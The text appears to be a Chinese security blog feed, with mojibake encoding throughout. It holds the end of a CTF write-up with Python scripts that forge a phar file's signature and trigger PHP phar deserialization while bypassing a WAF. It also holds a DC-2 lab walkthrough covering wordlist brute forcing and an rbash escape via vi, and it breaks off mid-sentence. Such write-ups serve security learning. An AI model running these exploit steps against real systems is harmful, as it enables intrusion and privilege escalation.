<p>okï¼Œç¨‹åºè¿è¡Œåä¼šç”Ÿæˆä¸€ä¸ªczy.pharæ–‡ä»¶ã€‚æˆ‘ä»¬çœ‹å®ƒçš„metadataéƒ¨åˆ†</p>
<p><img src="https://img-blog.csdnimg.cn/2771c6ad047944e2b91e0608e09d73b9.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>æ³¨æ„è¿™0æ˜¯å°†å¯¹è±¡å®ä¾‹åŒ–çš„å†…å®¹ï¼Œç”±äºgetflagé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¾ç¤ºäº†<code>&#123;&#125;i</code>ï¼Œè€Œè¿™é‡Œçš„1å°±æ˜¯nullï¼Œæ­¤æ—¶å¦‚æœæˆ‘ä»¬æŠŠ1å¼ºè¡Œæ”¹ä¸º0ï¼Œé‚£ä¹ˆå°±éªŒè¯äº†ä¸Šé¢çš„è¯´æ³•<code>ä»¤èµ‹å€¼æ•°ç»„ä¸ºnull</code>ä»è€Œè§¦å‘GCæœºåˆ¶ã€‚ä½†æ˜¯ä¹Ÿè¦æ³¨æ„ï¼Œå†å°†<code>0:&#123;&#125;i:1;N;</code>æ”¹ä¸º<code>0:&#123;&#125;i:0;N;</code>åï¼Œè¯¥æ–‡ä»¶éœ€è¦å¯¹ç­¾åè¿›è¡Œä¿®å¤ï¼Œpharæ–‡ä»¶ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€åå28ä½çš„åå››ä½æ˜¯å›ºå®šæ ‡è¯†GBMBï¼Œ21-24ä½ä»£è¡¨çš„æ˜¯sha1ç­¾åæ ‡è¯†ï¼Œè€Œ1-20ä½åœ¨è¿™é‡Œå°±éœ€è¦ä¿®æ”¹äº†ã€‚</p>
<p>å€Ÿé‰´ä¸€ä¸‹è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1 <span class="token comment">#sha1ç­¾å</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
   text<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   main<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>        <span class="token comment">#æ­£æ–‡éƒ¨åˆ†(é™¤å»æœ€å28å­—èŠ‚)</span>
   end<span class="token operator">=</span>text<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
   new_sign<span class="token operator">=</span>sha1<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>
   new_phar<span class="token operator">=</span>main<span class="token operator">+</span>new_sign<span class="token operator">+</span>end
   <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>new_phar<span class="token punctuation">)</span>     <span class="token comment">#å°†æ–°ç”Ÿæˆçš„å†…å®¹ä»¥äºŒè¿›åˆ¶æ–¹å¼è¦†ç›–å†™å…¥åŸæ¥çš„pharæ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œ1-20ä½é‡æ–°è¿›è¡Œäº†sha1ç­¾åï¼Œä¿®å¤å¥½åï¼Œç”±äºpharæ–‡ä»¶é‡Œè¿˜æœ‰getflagæ˜æ–‡ï¼Œå¦‚æœè¦ç»•è¿‡æ­£åˆ™çš„è¯ï¼Œä¸€ä¸ªæ–¹æ³•å°±æ˜¯<strong>ä¼ æ•°ç»„</strong>æ¥ç»•è¿‡æ­£åˆ™ï¼Œå¦ä¸€ç§åŠæ³•å°±æ˜¯å°†czy.pharå†è¿›è¡Œä¸€æ¬¡<strong>å‹ç¼©</strong>ï¼Œè¿™æ ·å°±ä¸ä¼šå‡ºç°getflagå­—æ ·ã€‚</p>
<p>æ³•ä¸€ï¼š</p>
<p>ä¼ æ•°ç»„</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url<span class="token operator">=</span><span class="token string">"http://node4.anna.nssctf.cn:28513/"</span>

<span class="token comment">### å†™å…¥pharæ–‡ä»¶</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"czy.phar"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'0[]'</span><span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                                    <span class="token comment">#æ³¨æ„è¿™é‡Œè¦ä¼ æ•°ç»„ï¼Œæ¥ç»•è¿‡waf</span>
    param1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span><span class="token punctuation">&#125;</span>
    p1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>param1<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">)</span>
    <span class="token comment">#print(p1.text)</span>

<span class="token comment">### è¯»pharæ–‡ä»¶ï¼Œè§¦å‘ååºåˆ—åŒ–</span>
param2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span><span class="token punctuation">&#125;</span>
data2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">"phar://tmp/a.txt"</span><span class="token punctuation">&#125;</span>
p2<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">)</span>
p2<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span>
flag<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'NSSCTF\&#123;.*?\&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>p2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#ç”¨æ­£åˆ™åŒ¹é…åŒ¹é…poståŒ…çš„response.texté‡Œçš„â€˜NSSCTF&#123;xxxxxx&#125;â€™</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ³•äºŒï¼š</p>
<p>å‹ç¼©czy.pharæ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/a43894200dcf4af8a31e75a1a9ad2ccf.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>ä¹‹å</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://node4.anna.nssctf.cn:28513/'</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"w";&#125;'</span>

    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'czy.phar.gz'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token punctuation">,</span>
    params<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'O:1:"A":1:&#123;s:6:"config";s:1:"r";&#125;'</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">'phar://tmp/a.txt'</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>
res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/95dfa9dfc043429a91753966aae7dffa.png" alt="2"></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#GC%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%AE%9E%E9%99%85%E8%BF%90%E7%94%A8">å‚è€ƒé“¾æ¥1</a></p>
<p><a href="http://xilzy666.gitee.io/xilzy/2022/03/05/nss-prize1-2/">å‚è€ƒé“¾æ¥2</a></p>
<p><a href="https://blog.csdn.net/qq_51295677/article/details/123520193?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">å‚è€ƒé“¾æ¥3</a></p>
<p><a href="https://www.php.net/manual/zh/features.gc.php">å‚è€ƒé“¾æ¥4</a></p>
<p><a href="https://blog.csdn.net/qq_53460654/article/details/121889104?ydreferer=aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzNDYwNjU0L2FydGljbGUvZGV0YWlscy8xMjE4ODkxMDQ=">å‚è€ƒé“¾æ¥5</a></p>
<p><a href="https://blog.csdn.net/weixin_53090346/article/details/127598455?ydreferer=aHR0cHM6Ly93d3cuYmluZy5jb20v">å‚è€ƒé“¾æ¥6</a></p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2æ‰“é¶ç¬”è®°</title>
    <url>/2023/07/09/DC-2%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="é¶æœºå®‰è£…ä»¥åŠé…ç½®"><a href="#é¶æœºå®‰è£…ä»¥åŠé…ç½®" class="headerlink" title="é¶æœºå®‰è£…ä»¥åŠé…ç½®"></a>é¶æœºå®‰è£…ä»¥åŠé…ç½®</h2><p>å‡†å¤‡ï¼š</p>
<blockquote>
<p>kaliè™šæ‹Ÿæœº<br>dc-2é¶æœº<br>windows11(å¯ç”¨å¯ä¸ç”¨)</p>
</blockquote>
<p>é¶åœºä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a><br>ä¸‹è½½å¥½åç”¨VMæ‰“å¼€ï¼Œè®¾ç½®ä¸ºNATæ¨¡å¼<br><img src="https://img-blog.csdnimg.cn/3a2cf2a875e2404a8b5653dde6445ccc.png" alt="1"></p>
<p>å¼€æœº</p>
<h2 id="æ‰“é¶"><a href="#æ‰“é¶" class="headerlink" title="æ‰“é¶"></a>æ‰“é¶</h2><p><strong>æ¢æµ‹ä¸»æœºå­˜æ´»</strong><br>ä½¿ç”¨å·¥å…·nmapï¼š<code>nmap 192.168.206.136/24</code><br>æ£€æµ‹åˆ°dc-2é¶æœºåœ°å€ä¸º192.168.206.136<br><img src="https://img-blog.csdnimg.cn/4a9b341fd14d4e7587ad30fc6bbbf3fb.png" alt="2"><br><strong>æ·±åº¦æ¢æµ‹é¶æœºä¿¡æ¯</strong></p>
<p><code>nmap -sV -p- 192.168.206.136</code></p>
<blockquote>
<p>-sV:ç«¯å£æ‰«æå¹¶è·å–æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯<br>-p-:å…¨ç«¯å£æ‰«æ </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/9129aeec46a7400e91881908ff120fa4.png" alt="3"><br>ç™»é™†ç½‘ç«™192.168.206.136<br>ç™»é™†ç½‘ç«™æ—¶ä¼šå‘ç”Ÿä¸€äº›é—®é¢˜æ˜¾ç¤º<code>Did not follow redirect to http://dc-2/</code>ï¼Œæ„æ€å°±æ˜¯æ²¡æœ‰é‡å®šå‘åˆ°<a href="http://dc-2/%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E6%89%93%E9%9D%B6%E7%9A%84%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E8%BF%9B%E8%A1%8C%E7%9A%84%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8kali%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9C%80%E8%A6%81%E5%B0%86kali%E7%9A%84hosts%E6%96%87%E4%BB%B6%EF%BC%88/etc/hosts%EF%BC%89%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%8B%E6%9C%AC%E5%9C%B0DNS%E8%A7%A3%E6%9E%90%E3%80%82">http://dc-2/ï¼Œç”±äºæˆ‘æ‰“é¶çš„æ—¶å€™ä½¿ç”¨æœ¬æœºè¿›è¡Œçš„ï¼ŒåŒæ—¶ä¼šä½¿ç”¨kaliä¸Šçš„ä¸€äº›å·¥å…·ï¼Œé‚£ä¹ˆéœ€è¦å°†kaliçš„hostsæ–‡ä»¶ï¼ˆ/etc/hostsï¼‰æ·»åŠ ä¸€ä¸‹æœ¬åœ°DNSè§£æã€‚</a></p>
<p><img src="https://img-blog.csdnimg.cn/af1bd1db85754fda8912593927733dcf.png" alt="3"><br><strong>windows</strong>hostæ–‡ä»¶åœ¨<code>&quot;C:\Windows\System32\drivers\etc\hosts&quot;</code>ï¼Œæ·»åŠ å®Œä¹‹åå³å¯æ­£å¸¸è¿›è¡Œã€‚<br>æ‰“å¼€ç½‘ç«™åæŸ¥çœ‹ç½‘ç«™æ•´ä½“æ¡†æ¶ï¼Œå¯ä»¥ä½¿ç”¨kaliä¸­çš„å·¥å…·<code>whatweb</code>ï¼Œæˆ–è€…æµè§ˆå™¨æ’ä»¶<br><img src="https://img-blog.csdnimg.cn/03fd35a8fd4948e890abcd0db30f9bf3.png" alt="2"><br>å¯ä»¥çŸ¥é“ç½‘ç«™æ˜¯wordpress<br>æ‹¿åˆ°flag1<br><img src="https://img-blog.csdnimg.cn/0fc407bd818c4d52a034bf10a1cefb37.png" alt="6"></p>
<blockquote>
<p>æ ‡å¿— 1ï¼š<br>ä½ å¸¸ç”¨çš„å•è¯è¡¨å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œæ‰€ä»¥ï¼Œä¹Ÿè®¸ä½ åªéœ€è¦ cewl å³å¯ã€‚<br>å¯†ç è¶Šå¤šè¶Šå¥½ï¼Œä½†æœ‰æ—¶æ‚¨æ— æ³•èµ¢å¾—æ‰€æœ‰å¯†ç ã€‚<br>ä»¥ä¸€ä¸ªèº«ä»½ç™»å½•å³å¯æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ ‡å¿—ã€‚<br>å¦‚æœæ‰¾ä¸åˆ°ï¼Œè¯·ä»¥å…¶ä»–èº«ä»½ç™»å½•ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹cewlæ˜¯ä»€ä¹ˆ</p>
<blockquote>
<p>cewl æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆè‡ªå®šä¹‰å­—å…¸ï¼ˆcustom wordlistï¼‰çš„å·¥å…·ï¼Œå®ƒæ˜¯æ ¹æ®ç›®æ ‡ç½‘ç«™æˆ–æ–‡æœ¬ä¸­æå–çš„å•è¯å’ŒçŸ­è¯­åˆ›å»ºå­—å…¸çš„ä¸€ç§æ–¹å¼ã€‚<br>cewl çš„å…¨ç§°æ˜¯ â€œCustom Word List generatorâ€ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºRubyç¼–å†™çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ†ææŒ‡å®šçš„æ–‡æœ¬æˆ–é€šè¿‡çˆ¬å–ç›®æ ‡ç½‘ç«™æå–å‡ºçš„å•è¯ï¼Œå¹¶æ ¹æ®æå–çš„å†…å®¹ç”Ÿæˆä¸€ä¸ªå®šåˆ¶çš„å­—å…¸ã€‚<br>è¿™ä¸ªå·¥å…·åœ¨æ¸—é€æµ‹è¯•å’Œå®‰å…¨è¯„ä¼°ä¸­ç»å¸¸ç”¨äºå¯†ç ç ´è§£ã€æš´åŠ›æ”»å‡»å’Œç¤¾äº¤å·¥ç¨‹ç­‰æ–¹é¢ã€‚é€šè¿‡ç”Ÿæˆé’ˆå¯¹ç‰¹å®šç›®æ ‡çš„å­—å…¸ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•ä½¿ç”¨å¸¸è§çš„ã€æœ‰å¯èƒ½ä¸ç›®æ ‡ç›¸å…³çš„å•è¯å’ŒçŸ­è¯­è¿›è¡Œå¯†ç ç ´è§£æˆ–æ”»å‡»ã€‚<br>cewl å¯ä»¥æ ¹æ®ä¸åŒçš„é€‰é¡¹å’Œå‚æ•°æ¥è°ƒæ•´å­—å…¸çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œä¾‹å¦‚æ’é™¤ç‰¹å®šçš„å•è¯ã€è®¾ç½®æœ€å°å’Œæœ€å¤§é•¿åº¦é™åˆ¶ã€æŒ‡å®šè¾“å‡ºæ–‡ä»¶ç­‰ã€‚</p>
</blockquote>
<p>é‚£æ„æ€å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå°±è®©æˆ‘ä»¬ç™»å½•è¿›å»ï¼Œå…ˆç”¨cewlåˆ¶ä½œå¯†ç å­—å…¸<br><code>cewl url -w æ–‡ä»¶å</code>å³å¯ç”Ÿæˆä¸€ä¸ªå­—å…¸ï¼Œåé¢ä½ å¯ä»¥ä½¿ç”¨wpscanè¿›è¡Œç”¨æˆ·åçŒœè§£å’Œå¯†ç çˆ†ç ´ï¼Œåç»­å°±ä¸æ¼”ç¤ºäº†ï¼Œæœ€åå¯çŸ¥å­˜åœ¨ç”¨æˆ·<strong>adminï¼Œjerryï¼Œtom</strong>å¯†ç å°±ä½¿ç”¨cewlè·‘å‡ºæ¥çš„å¯†ç ã€‚æœ€åå¯ä»¥æ‰¾å‡ºjerryå’Œtomçš„å¯†ç ï¼Œåé¢ç™»é™†jerryç”¨æˆ·åå¯ä»¥å¾—åˆ°flag2<br><img src="https://img-blog.csdnimg.cn/3381eac70aea4ae0841ad1cec1a30318.png" alt="2"></p>
<blockquote>
<p>å¦‚æœä½ æ— æ³•åˆ©ç”¨ WordPress å¹¶èµ°æ·å¾„ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ã€‚<br>å¸Œæœ›æ‚¨æ‰¾åˆ°å¦ä¸€ä¸ªåˆ‡å…¥ç‚¹ã€‚</p>
</blockquote>
<p>åœ¨è¿™é‡Œæƒ³åˆ°åˆšæ‰æ¢æµ‹ç«¯å£çš„æ—¶å€™å­˜åœ¨sshï¼Œä½†æ˜¯ç«¯å£æ”¹åˆ°äº†7744ï¼Œä½¿ç”¨sshç™»é™†ä¸€ä¸‹ã€‚<br>ç›´æ¥å†™çŸ¥è¯†ç‚¹å§ï¼Œè‚ä¸€å¤©äº†ã€‚ã€‚ã€‚</p>
<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="ä¸»æœºæ¢æµ‹"><a href="#ä¸»æœºæ¢æµ‹" class="headerlink" title="ä¸»æœºæ¢æµ‹"></a>ä¸»æœºæ¢æµ‹</h3><p>è¿™ä¸ªæ—¶å€™ä½¿ç”¨nmapè¿›è¡Œæ¢æµ‹</p>
<blockquote>
<p>nmap -A -p- 192.168.206.136 å…¨ç«¯å£æ¢æµ‹ï¼Œè¿˜æœ‰ç«¯å£æœåŠ¡ä»¥åŠè¯¦ç»†é…ç½®</p>
</blockquote>
<h3 id="æœ¬åœ°DNSè®¾ç½®"><a href="#æœ¬åœ°DNSè®¾ç½®" class="headerlink" title="æœ¬åœ°DNSè®¾ç½®"></a>æœ¬åœ°DNSè®¾ç½®</h3><p><strong>hostsæ–‡ä»¶åœ°å€</strong><br>windowsï¼šâ€C:\Windows\System32\drivers\etc\hostsâ€<br>linuxï¼š&#x2F;etc&#x2F;hosts</p>
<h3 id="cewlå·¥å…·çš„ä½¿ç”¨"><a href="#cewlå·¥å…·çš„ä½¿ç”¨" class="headerlink" title="cewlå·¥å…·çš„ä½¿ç”¨"></a>cewlå·¥å…·çš„ä½¿ç”¨</h3><p>cewl æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆè‡ªå®šä¹‰å­—å…¸ï¼ˆcustom wordlistï¼‰çš„å·¥å…·ï¼Œå®ƒæ˜¯æ ¹æ®ç›®æ ‡ç½‘ç«™æˆ–æ–‡æœ¬ä¸­æå–çš„å•è¯å’ŒçŸ­è¯­åˆ›å»ºå­—å…¸çš„ä¸€ç§æ–¹å¼ã€‚</p>
<p>cewl çš„å…¨ç§°æ˜¯ â€œCustom Word List generatorâ€ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºRubyç¼–å†™çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ†ææŒ‡å®šçš„æ–‡æœ¬æˆ–é€šè¿‡çˆ¬å–ç›®æ ‡ç½‘ç«™æå–å‡ºçš„å•è¯ï¼Œå¹¶æ ¹æ®æå–çš„å†…å®¹ç”Ÿæˆä¸€ä¸ªå®šåˆ¶çš„å­—å…¸ã€‚</p>
<p>è¿™ä¸ªå·¥å…·åœ¨æ¸—é€æµ‹è¯•å’Œå®‰å…¨è¯„ä¼°ä¸­ç»å¸¸ç”¨äºå¯†ç ç ´è§£ã€æš´åŠ›æ”»å‡»å’Œç¤¾äº¤å·¥ç¨‹ç­‰æ–¹é¢ã€‚é€šè¿‡ç”Ÿæˆé’ˆå¯¹ç‰¹å®šç›®æ ‡çš„å­—å…¸ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•ä½¿ç”¨å¸¸è§çš„ã€æœ‰å¯èƒ½ä¸ç›®æ ‡ç›¸å…³çš„å•è¯å’ŒçŸ­è¯­è¿›è¡Œå¯†ç ç ´è§£æˆ–æ”»å‡»ã€‚</p>
<p>cewl å¯ä»¥æ ¹æ®ä¸åŒçš„é€‰é¡¹å’Œå‚æ•°æ¥è°ƒæ•´å­—å…¸çš„ç”Ÿæˆè¿‡ç¨‹ï¼Œä¾‹å¦‚æ’é™¤ç‰¹å®šçš„å•è¯ã€è®¾ç½®æœ€å°å’Œæœ€å¤§é•¿åº¦é™åˆ¶ã€æŒ‡å®šè¾“å‡ºæ–‡ä»¶ç­‰ã€‚<br>åŸºç¡€å‘½ä»¤ï¼š<code>cewl url -w æ–‡ä»¶å</code>è¿™æ ·ä¹‹åä¼šç”Ÿæˆä¸€ä¸ªæœ‰å…³è¯¥ç½‘ç«™çš„å­—å…¸ï¼Œä¾¿äºåé¢çˆ†ç ´å¯†ç ä½¿ç”¨ã€‚<br><a href="https://www.freebuf.com/articles/network/190128.html">Kali Linuxå­—å…¸ç”Ÿæˆå·¥å…·Cewlä½¿ç”¨å…¨æŒ‡å—</a></p>
<h3 id="sshç™»å½•"><a href="#sshç™»å½•" class="headerlink" title="sshç™»å½•"></a>sshç™»å½•</h3><p>è¿™ä¸ªtomç”¨æˆ·å¯ä»¥ç™»å½•ï¼Œjerryç™»é™†ä¸äº†ï¼Œå¯†ç å°±æ˜¯çˆ†ç ´å‡ºæ¥çš„ã€‚</p>
<h3 id="rbashé€ƒé€¸-ææƒçš„ä¸€ç§"><a href="#rbashé€ƒé€¸-ææƒçš„ä¸€ç§" class="headerlink" title="rbashé€ƒé€¸(ææƒçš„ä¸€ç§)"></a>rbashé€ƒé€¸(ææƒçš„ä¸€ç§)</h3><p>rbashï¼šå°±æ˜¯å—é™çš„bashï¼ˆbashï¼Œä¸€ä¸ªå‘½ä»¤è¡Œè§£é‡Šå™¨ï¼Œæ¥å—ç”¨æˆ·è¾“å…¥çš„æŒ‡ä»¤å¹¶ä¸”æ‰§è¡Œç›¸åº”çš„å‘½ä»¤ï¼‰ï¼Œä¸€äº›å‘½ä»¤ä¸èƒ½ä½¿ç”¨<br>ä»¥ä¸‹æƒ…å†µæ˜¯ä¸å…è®¸rbashæ‰§è¡Œçš„</p>
<blockquote>
<p>ä½¿ç”¨å‘½ä»¤cdæ›´æ”¹ç›®å½•<br>è®¾ç½®æˆ–è€…å–æ¶ˆç¯å¢ƒå˜é‡çš„è®¾ç½®ï¼ˆSHELL, PATH, ENV, or BASH_ENVï¼‰<br>æŒ‡å®šåŒ…å«å‚æ•°â€™&#x2F;â€˜çš„æ–‡ä»¶å<br>æŒ‡å®šåŒ…å«å‚æ•°â€™ - â€˜çš„æ–‡ä»¶å<br>ä½¿ç”¨é‡å®šå‘è¾“å‡ºâ€™&gt;â€™, â€˜&gt;&gt;â€™, â€˜&gt; |â€™, â€˜&lt;&gt;â€™ â€˜&gt;&amp;â€™,â€™&amp;&gt;â€™</p>
</blockquote>
<p>å¤§è‡´çš„é™åˆ¶å¦‚ä¸Š<br>å› æ­¤æœ¬é¶åœºç”¨åˆ°rbashé€ƒé€¸ï¼Œç”±äºæµ‹è¯•åå‘ç°viå‘½ä»¤å¯ä»¥ä½¿ç”¨ï¼Œå› æ­¤ä½¿ç”¨viè®¾ç½®shellã€‚<br>è¿›å…¥viç•Œé¢</p>
<blockquote>
<p>vi</p>
<p>ç„¶åæŒ‰Escé”®ï¼Œè¾“å…¥<br>:set shell&#x3D;&#x2F;bin&#x2F;bash</p>
</blockquote>
<p>è®¾ç½®å¥½shellå¹¶å›è½¦ï¼Œæ¥ç€è¾“å…¥ </p>
<blockquote>
<p>:shell</p>
<p>å›è½¦ï¼Œå¯åŠ¨shell<br>ä¹‹åé€€å‡ºviç¼–è¾‘å™¨ï¼ŒæŸ¥çœ‹æƒé™ã€‚ç»“æœè¿™ä¸ªé¶æœºæ²¡æœ‰æˆåŠŸï¼Œæ­£å¸¸æ˜¯å·²ç»å¯ä»¥äº†ï¼Œç”±äºè¿™ä¸ªé¶æœºçš„ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨å‘½ä»¤æ·»åŠ ç¯å¢ƒå˜é‡<br><code>export PATH=$PATH:/bin/</code><br>è¿™æ¡å‘½ä»¤å°†æŠŠ &#x2F;bin&#x2F; ç›®å½•æ·»åŠ åˆ°å½“å‰ PATH ç¯å¢ƒå˜é‡ä¸­ã€‚<br>ç¯å¢ƒå˜é‡ PATH æŒ‡å®šäº†æ“ä½œç³»ç»Ÿåœ¨æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶æ—¶è¦æœç´¢çš„ç›®å½•åˆ—è¡¨ã€‚é€šè¿‡å°†ä¸€ä¸ªç›®å½•è·¯å¾„æ·»åŠ åˆ° PATH ä¸­ï¼Œä½ å¯ä»¥ä½¿ç³»ç»Ÿåœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>å…·ä½“è€Œè¨€ï¼Œexport PATH&#x3D;$PATH:&#x2F;bin&#x2F; è¿™æ¡å‘½ä»¤çš„å«ä¹‰æ˜¯ï¼š<br>$PATH è¡¨ç¤ºå½“å‰å·²ç»è®¾ç½®çš„ PATH 